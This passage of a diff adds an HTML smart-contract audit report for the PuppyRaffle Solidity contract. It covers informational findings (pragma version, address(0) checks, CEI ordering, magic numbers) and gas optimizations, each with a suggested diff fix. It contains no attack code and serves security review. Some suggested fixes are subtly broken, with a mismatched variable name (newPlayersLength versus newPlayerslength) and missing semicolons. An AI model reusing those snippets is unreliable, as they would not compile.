+        function they may think they have not entered the raffle when
+        they actually already have.</p>
+        <p><strong>Impact</strong> This will cause confusion to players
+        at index <code>0</code> of the players array and may cause them
+        to attempt to reenter the raffle, wasting gas.</p>
+        <p><strong>Recommended Mitigation</strong> To mitigate this
+        issue you can do one of the following: Revert if the plsyer is
+        not active. Reserve the 0th index in the players array. Change
+        the return value to a int256 and return -1 if the player is not
+        active.</p>
+        <h3 id="informational-findings">Informational Findings</h3>
+        <h4 id="i-1-solidity-pragma-should-be-specific">[I-1] Solidity
+        pragma should be specific</h4>
+        <p>Consider using a specific version of solidity instead of a
+        wide version.</p>
+        <p>I recommend you change Change
+        <code>pragma solidity ^0.7.6;</code> to
+        <code>pragma solidity 0.7.6;</code>.</p>
+        <h4 id="i-2-solidity-pragma-should-be-a-modern-version">[I-2]
+        Solidity pragma should be a modern version</h4>
+        <p>Consider using a more modern version of solidity, currently
+        recommended version is <code>0.8.18</code>: I recommend you
+        Change <code>pragma solidity ^0.7.6;</code> to
+        <code>pragma solidity 0.8.18;</code>.</p>
+        <h4
+        id="i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables">[I-3]
+        Missing Checks for <code>address(0)</code> when assigning values
+        to address state variables</h4>
+        <p>Assigning values to address state variables without checking
+        for address(0).</p>
+        <ul>
+        <li>Found in src/PuppyRaffle.sol: 7800:26:35</li>
+        <li>Found in src/PuppyRaffle.sol: 6943:23:35</li>
+        <li>Found in src/PuppyRaffle.sol: 2876:24:35</li>
+        </ul>
+        <h4 id="i-4-selectwinner-does-not-follow-cei">[I-4]
+        <code>selectWinner()</code> does not follow CEI</h4>
+        <p>It is best to follow best practices when writing
+        solidity.</p>
+        <div class="sourceCode" id="cb22"><pre
+        class="sourceCode diff"><code class="sourceCode diff"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="st">-       (bool success,) = winner.call{value: prizePool}(&quot;&quot;);</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="st">-       require(success, &quot;PuppyRaffle: Failed to send prize pool to winner&quot;);</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>        _safeMint(winner, tokenId);</span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="va">+       (bool success,) = winner.call{value: prizePool}(&quot;&quot;);</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="va">+       require(success, &quot;PuppyRaffle: Failed to send prize pool to winner&quot;);</span></span></code></pre></div>
+        <h4 id="i-5-use-of-magic-numbers-is-discouraged">[I-5] Use of
+        “magic” numbers is discouraged</h4>
+        <p>Use of number literals in a code base can hurt readability
+        and make code changes more difficult.</p>
+        <div class="sourceCode" id="cb23"><pre
+        class="sourceCode diff"><code class="sourceCode diff"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="va">+       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="va">+       uint256 public constant FEE_PERCENTAGE = 20;</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="va">+       uint256 public constant POOL_PRECISION = 100;</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>        ------------------------------------------------------- </span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="st">-       uint256 prizePool = (totalAmountCollected * 80) / 100;</span></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="st">-       uint256 fee = (totalAmountCollected * 20) / 100;</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="va">+       uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a><span class="va">+       uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;</span></span></code></pre></div>
+        <h3 id="gas-optimization-findings">Gas Optimization
+        Findings</h3>
+        <h4
+        id="g-1-unchanged-state-variables-should-be-declared-constant-or-immutable">[G-1]
+        Unchanged state variables should be declared constant or
+        immutable</h4>
+        <p>Reading from storage is more expensive then reading an
+        immutable/constant variable.</p>
+        <p>Instances:</p>
+        <p><a
+        href="https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L38C1-L50C53">Image
+        URI’s should be constants:</a></p>
+        <pre><code>@&gt;  string private commonImageUri = &quot;ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8&quot;;
+    uint256 public constant COMMON_RARITY = 70;
+    string private constant COMMON = &quot;common&quot;;
+
+    // Stats for the rare puppy (st. bernard)
+@&gt;  string private rareImageUri = &quot;ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW&quot;;
+    uint256 public constant RARE_RARITY = 25;
+    string private constant RARE = &quot;rare&quot;;
+
+    // Stats for the legendary puppy (shiba inu)
+@&gt;  string private legendaryImageUri = &quot;ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU&quot;;
+    uint256 public constant LEGENDARY_RARITY = 5;
+    string private constant LEGENDARY = &quot;legendary&quot;;</code></pre>
+        <p><a
+        href="https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L24"><code>raffleDuration</code>
+        should be immutable</a></p>
+        <pre><code>@&gt;  uint256 public raffleDuration;</code></pre>
+        <h4 id="g-2-storage-variables-in-a-loop-should-be-cached">[G-2]
+        Storage variables in a loop should be cached</h4>
+        <p>Storage variables such as <code>players.length</code> should
+        be cached in loops to avoid constantly reading from storage.</p>
+        <p><a
+        href="https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L111-L115"><code>getActivePlayerIndex()</code></a></p>
+        <div class="sourceCode" id="cb26"><pre
+        class="sourceCode diff"><code class="sourceCode diff"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="va">+uint256 playersLength = players.length</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="va">+for (uint256 i = 0; i &lt; playersLength; i++) {</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="st">-for (uint256 i = 0; i &lt; players.length; i++) {</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>            if (players[i] == player) {</span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>                return i;</span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>        }</span></code></pre></div>
+        <p><a
+        href="https://github.com/Cyfrin/4-puppy-raffle-audit/blob/2a47715b30cf11ca82db148704e67652ad679cd8/src/PuppyRaffle.sol#L80-L90"><code>enterRaffle()</code></a></p>
+        <div class="sourceCode" id="cb27"><pre
+        class="sourceCode diff"><code class="sourceCode diff"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="va">+       uint256 newPlayersLength = newPlayers.length;</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="va">+       require(msg.value == entranceFee * newPlayerslength, &quot;PuppyRaffle: Must send enough to enter raffle&quot;);</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="va">+        for (uint256 i = 0; i &lt; newPlayerslength; i++) {</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="st">-       require(msg.value == entranceFee * newPlayers.length, &quot;PuppyRaffle: Must send enough to enter raffle&quot;);</span></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="st">-       for (uint256 i = 0; i &lt; newPlayers.length; i++) {</span></span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a>            players.push(newPlayers[i]);</span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-10"><a href="#cb27-10" aria-hidden="true" tabindex="-1"></a>        // Check for duplicates</span>
+<span id="cb27-11"><a href="#cb27-11" aria-hidden="true" tabindex="-1"></a><span class="va">+       uint256 playersLength = players.length</span></span>
+<span id="cb27-12"><a href="#cb27-12" aria-hidden="true" tabindex="-1"></a><span class="va">+       for (uint256 i = 0; i &lt; playersLength - 1; i++) {</span></span>
+<span id="cb27-13"><a href="#cb27-13" aria-hidden="true" tabindex="-1"></a><span class="va">+           for (uint256 j = i + 1; j &lt; playersLength; j++) {</span></span>
+<span id="cb27-14"><a href="#cb27-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-15"><a href="#cb27-15" aria-hidden="true" tabindex="-1"></a><span class="st">-       for (uint256 i = 0; i &lt; players.length - 1; i++) {</span></span>
+<span id="cb27-16"><a href="#cb27-16" aria-hidden="true" tabindex="-1"></a><span class="st">-           for (uint256 j = i + 1; j &lt; players.length; j++) {</span></span>
+<span id="cb27-17"><a href="#cb27-17" aria-hidden="true" tabindex="-1"></a>                require(players[i] != players[j], &quot;PuppyRaffle: Duplicate player&quot;);</span>
+<span id="cb27-18"><a href="#cb27-18" aria-hidden="true" tabindex="-1"></a>            }</span>
+<span id="cb27-19"><a href="#cb27-19" aria-hidden="true" tabindex="-1"></a>        }</span></code></pre></div>
+</body>
+</html>
